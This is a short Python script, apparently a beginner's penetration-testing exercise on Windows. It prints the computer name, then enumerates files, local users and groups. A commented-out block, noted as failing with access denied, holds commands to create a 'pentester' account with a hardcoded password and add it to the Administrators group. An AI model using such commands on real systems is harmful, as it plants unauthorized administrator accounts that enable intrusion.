import os
import platform
import socket

"""
3 ways to get computer name
"""
my_host = socket.gethostname()
print(my_host)
my_environment = os.environ["COMPUTERNAME"]
print(my_environment)
my_platform = platform.node()
print(my_platform)

print(f'Hi, there! PC {my_host}')
input('Press Enter key to run')
for line in os.popen('dir /B'):
    print(line)
os.system('cmd.exe /c ifconfig')
os.system('cmd.exe /c net user')
os.system('cmd.exe /c net localgroup')
"""
Access denied. System error 5.
os.system("cmd.exe /c net user pentester i23A567B /add")
os.system("cmd.exe /c net localgroup администраторы pentester /add")
os.system('cmd.exe /c net user')
"""
input('Press any key...')
